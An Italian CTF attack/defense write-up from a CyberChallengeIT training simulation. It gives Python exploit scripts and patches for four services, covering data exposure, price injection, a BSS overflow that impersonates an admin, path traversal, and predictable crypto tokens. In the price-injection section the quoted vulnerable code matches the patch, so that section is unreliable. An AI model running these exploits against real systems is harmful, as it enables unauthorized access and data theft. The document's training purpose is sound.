# Simulazione 2

Seconda simulazione in formato Attack/Defense svolta il 15 e 16 giugno per l'addestramento previsto dal percorso CyberChallengeIT.

I servizi qui proposti erano:
* CApp
* CC_Manager
* FIXME
* TiCCket

## FIXME
_Categoria: web_

FIXME è una challenge web. Essa mette a disposizione solo un backend col quale interagire, senza frontend.

### Vulnerabilità 1 - Sensitive data exposure

La prima vulnerabilità è molto semplice. L'applicazione forniva un endpoint "/api/products" che forniva informazioni relative ai prodotti. Tuttavia, veniva anche esposto un dato sensibile "secret", in cui era presente la flag (da notare che la challenge stessa dava un hint dicendo che bisognava mostrare solo nome e prezzo dei prodotti).

```javascript
// Display name and prices of products
app.get(
  '/',
  asyncWrapper(async (req, res) => {
    const offset = req.query.offset ? parseInt(req.query.offset, 10) : 0;
    const { rows } = await db.query(
      'SELECT * FROM "products" ORDER BY id DESC OFFSET $1 LIMIT 10',
      [offset]
    );

    res.json(rows);
  })
);
```

#### Exploit

L'exploit, di conseguenza, è stato anche molto semplice. Bastava fare una richiesta all'endpoint citato da cui si riceveva una lista di oggetti json. A quel punto la flag si trovava nel secret dei prodotti i cui id erano indicati cme flagIds dal gameserver.

```python
def get_flag(ip, hint):
	session = requests.Session()

	resp = session.get(f"http://{ip}:8080/api/products", timeout=10).json()
	flag = ""
	for x in resp:
		if str(x['id']) == hint:
			flag = x['secret']


	# PRELEVA FLAG E RESTITUISCILA
	return flag
```


#### Patch

Anche la patch non ha richiesto molti sforzi. È bastato modificare la query che prelevava i prodotti che venivano mostrati andando a prelevare tutti i campi tranne il secret.

```javascript
// Display name and prices of products
app.get(
  '/',
  asyncWrapper(async (req, res) => {
    const offset = req.query.offset ? parseInt(req.query.offset, 10) : 0;
    const { rows } = await db.query(
      'SELECT id, name, price FROM "products" ORDER BY id DESC OFFSET $1 LIMIT 10',
      [offset]
    );

    res.json(rows);
  })
);
```



### Vulnerabilità 2 - Price Injection

Un'altra vulnerabilità di questo servizio permetteva di vedere un prodotto anche se non si avevano abbastanza monete per poterlo fare. Ciò era possibile, in quanto nella richiesta POST da fare all'endpoint "/api/products/view" si poteva inserire anche il prezzo del prodotto e le monete dell'utente venivano confrontate con questo prezzo.

```javascript
// User: view a product if the user have enough fidelity coins
app.post(
  '/view',
  asyncWrapper(async (req, res) => {
    if (req.session.userId === undefined) {
      throw new HttpError(401, 'Unauthorized');
    }

    const { productId, price } = req.body;
    const {
      rows: [product]
    } = await db.query('SELECT * FROM "products" WHERE id = $1', [productId]);

    if (!product) {
      throw new HttpError(404, 'Product not found');
    }

    const {
      rows: [user]
    } = await db.query('SELECT * FROM "users" WHERE id = $1', [req.session.userId]);

    if (user.coins < product.price) {
      throw new HttpError(400, 'You need more fidelity coins to view this product');
    }

    res.json({
      secret: product.secret
    });
  })
);

```

#### Exploit

L'exploit dunque prevedeva di registrare un utente e visitare questo endpoint, inserendo come prezzo, ad esempio, 1, in quanto un utente appena registrato aveva a disposizione 10 monete (da notare che si fa il riscatto della gift card che viene data in seguito alla registrazione per generare "rumore").

```python
def get_flag(ip, hint):
	session = requests.Session()

	username = generate_random_string(6)
	password = "password"
	data = {"username": username, "password": password}

	giftCard = session.post(f"http://{ip}:8080/api/users/register", json=data, timeout=3).json()

	response = session.post(f"http://{ip}:8080/api/giftCards/redeem", json=giftCard, timeout=3)
	
	data = {"productId": hint, "price": 1}
	response = session.post(f"http://{ip}:8080/api/products/view", json=data, timeout=3).json()

	# PRELEVA FLAG E RESTITUISCILA
	flag = response["secret"]
	return flag
```

#### Patch

La patch prevedeva semplicemente di utilizzare il prezzo del prodotto recuperato tramite la query, anziché il prezzo inserito dall'utente.

```javascript
if (user.coins < product.price) {
    throw new HttpError(400, 'You need more fidelity coins to view this product');
}
```



## TiCCket 
_Categoria: pwn_

![Gatto carino](imgs/primo.png)

TiCCket è una challenge della categoria pwn. E' un servizio
fornito tramite un server scritto in C. Il server permette di creare delle CTF o di caricarne alcune già esistenti. Ogni ctf ha dei ticket al suo interno. L'obbiettivo è caricare la ctf con il nome del flagID e leggere il contenuto del ticket con indice 0 della CTF. Normalmente l'accesso ai ticket di una CTF è consentito solo all'admin di quella CTF che ha un token associato.
Ma si possono sfruttare le vulnerabilità per fingersi l'admin.



### Vulnerabilità - 1 Carattere letto in più 
La vulnerabilità si trova all'interno di questa funzione: 

![Gatto carino](imgs/vuln.png)

Il problema è in questa riga:

![Gatto carino](imgs/riga.png)

Dato che il **g_admin_token** è in realtà lungo 17 char, si fa un BSS overflow andando a sovrascrivere la variabile globale **g_is_restricted** cambiandogli valore con un valore che sarà interpretato come false, dato che questa variabile se è messa a true indica che non si è un admin, se è messa a false indica che si è un admin.

Il codice dell'exploit è così semplice da comprendere, oltre a tutte le operazioni da fare per navigare all'interno del menù, la riga seguente esegue il BSS overflow dato che passa 20 caratteri invece che 17:

```python
p.sendline(b"xxxxxxxxxxxxxxxxxxxx")
```

Il codice completo:


```python
def get_flag(ip, hint):
    p=remote(ip,1337)
    p.recvuntil(b"> ", timeout=0.1)
    p.sendline(b"1")
    p.recvuntil(b": ", timeout=0.1)
    p.sendline(hint.encode())
    p.recvuntil(b": ", timeout=0.1)
    p.sendline(b"xxxxxxxxxxxxxxxxxxxx")
    p.recvuntil(b"> ", timeout=0.1)
    p.sendline(b"3")
    p.recvuntil(b": ", timeout=0.1)
    p.sendline(b"0")
    p.recvuntil(b"> ", timeout=0.1)
    p.sendline(b"2")
    p.recvuntil(b": ", timeout=0.1)
    p.recvuntil(b": ", timeout=0.1)
    stringa=p.recvuntil(b"=", timeout=0.1)
    return stringa.decode()
```


### Patch

Per patchare basta cambiare con Ghidra il valore 18 con 17 così che non si permetta più il BSS overflow.



## CApp
_Categoria: web, misc_

CApp è un'applicazione web di hosting che offre un sistema operativo chiamato ccOS basato su una singola classe Python. Esso inoltre, forniva una finestra di terminale che faceva eseguire solo alcuni comandi (per esempio: ls, cat, ...)

![alt text](imgs/capp-cover.png)

### Vulnerabilità - Path Traversal

Qui il problema individuato, consisteva nel fatto che era possibile accedere a volumi creati da altri utenti tramite path traversal. Nella cartella ".union.", infatti, erano presenti i volumi di tutti gli utenti. In questo modo bastava semplicemente accedere ai volumi degli utenti indicati dal gameserver, leggere all'interno dei file lì presenti e stampare la flag quando trovata. 

#### Exploit

Come già detto, l'obiettivo era individuare quale tra i file presenti nei volumi degli utenti indicati dal gameserver aveva la flag. L'exploit dunque era diviso come segue.

Inizialmente si registrava un utente:

```python
def get_flag(ip, hint):
	userid = json.loads(hint)["user_id"]
	session = requests.Session()

	username = generate_random_string(10)
	password = "password"

	data = f"username={username}&password={password}"
	register = session.post(f"http://{ip}/register" , data = data, headers = {"Content-Type": "application/x-www-form-urlencoded"}, timeout=1)
```

Successivamente si listavano i file presenti nel volume dell'utente considerato (flagId):

```python
	cmd = {"command": f"ls .union./volume-{userid}/"}
	cmd1 = session.post(f"http://{ip}/command", json=cmd, timeout=1).json()
	files = cmd1["output"].split(" ")
```

Infine, si scorrevano tutti questi file finché non si trovava la flag all'interno di uno di questi:

```python
	for f in files:
		cmd = {"command": f"cat .union./volume-{userid}/{f}"}
		cmd2 = session.post(f"http://{ip}/command", json=cmd, timeout=3).json()
		res = cmd2["output"]
		flag1 = re.findall("[A-Z0-9]{31}=", res)
		flag = flag1[0]
		if flag is not None:
			return flag
	
	raise Exception("No flag founded!")
```


#### Patch

Il problema dunque, risiedeva nel mounting del file system. Esso doveva essere montato ad un livello inferiore rispetto alla cartella .union.



## CC-Manager
_Categoria: crypto_

CC-Manager è una challenge crypto che funge da password manager. Permette quindi di registrarsi, loggarsi, memorizzare le proprie password, condividerle con altri utenti, ecc.

![alt text](imgs/cc-cover.png)

### Vulnerabilità - Unsafe Function

La vulnerabilità individuata in questo servizio è relativa all'uso della funzione _getPrime_. In particolare, si ha che quando un utente si registra, gli viene fornito un recovery token per il recupero della password. Se riuscissimo quindi a fare una predizione su questo token, potremmo recuperare la password di un utente e accedere al suo profilo. 

Quando un utente si registra gli viene fornito il recovery token che viene generato a partire dallo username. Per generare questo token vengono generati due numeri primi random a 768 bit.

```python
def get_secret_tokens(username):
    mask = (1 << 768) - 1
    p, q = getPrime(768), getPrime(768)
```

Il problema però risiede nella funzione getPrime con la quale si generano questi numeri. Essa infatti non genera dei numeri primi realmente casuali. Infatti, è stato possibile notare che il token relativo ad uno username variava sempre in 3 (o al max 4) possibili scelte. Questo proprio perché venivano scelti sempre gli stessi numeri primi.

#### Exploit

A questo punto quindi, l'idea per l'exploit è stata di calcolare da sè il possibile recovery token di uno username e sfruttarlo. Inizialmente era stato previsto un ciclo per fare in modo che si ripetesse questo calcolo finché non si trovava il token corretto. Tuttavia, è stato notato che questo, anche con l'uso dei thread, rallentava molto l'exploit. Per cui è stato scelto di fare il calcolo del token una sola volta. Ciò permetteva comunque di catturare molte flag. Di seguito la spiegazione dell'exploit.

Inizialmente, si calcolava il recovery token per lo username dato dal flagId.

```python
def get_flag(ip, hint):
	p = remote(ip, 5000)
	logged = False
	password = ""
	username = json.loads(hint)["username"]

	_, recovery_token = get_secret_tokens(username)
```

Successivamente si provava a utilizzare questo token per recuperare la password dell'utente.

```python
	p.recv(timeout=1)
	p.sendline(b"3")

	p.recv(timeout=1)
	p.sendline(username.encode())
	p.recv(timeout=1)
	p.sendline(recovery_token.encode())
	resp = p.recvline(timeout=1).decode()

	if "password" in resp:
		logged = True
		password = resp.split("password: ")[1]
```

Recuperata questa, si faceva il login.

```python
	p.recv(timeout=1)
	p.sendline(b"2")


	p.recvuntil(b"username: ", timeout=1)
	p.sendline(username.encode())
	
	p.recvuntil(b"password: ", timeout=1)
	p.sendline(password.strip().encode())
```

Infine, la flag era una delle password memorizzate da quell'utente.

```python
	p.recv(timeout=1)
	p.sendline("2".encode())
	resp = p.recv(timeout=1).decode()

	p.close()

	# PRELEVA FLAG E RESTITUISCILA
	flag = re.findall("[A-Z0-9]{31}=", resp)[0]
	return flag
```


#### Patch

La patch attuata consisteva semplicemente nel cifrare il token generato dalla funzione _get\_secret\_token_. Questa idea permetteva di bloccare tutti quegli attacchi che, come noi, andavano a precalcolare il token.

```python
sharing_key, recovery_token = crypto.get_secret_tokens(username)
encrypted_psw = crypto.encrypt_psw(recovery_token, password)
```

```python
with open(os.path.join(data_path, username, "pw_recovery"), "x") as f:
    f.write(str(encrypted_psw))
```

```python
print(f"Here is your password recovery token: {encrypted_psw}.")
```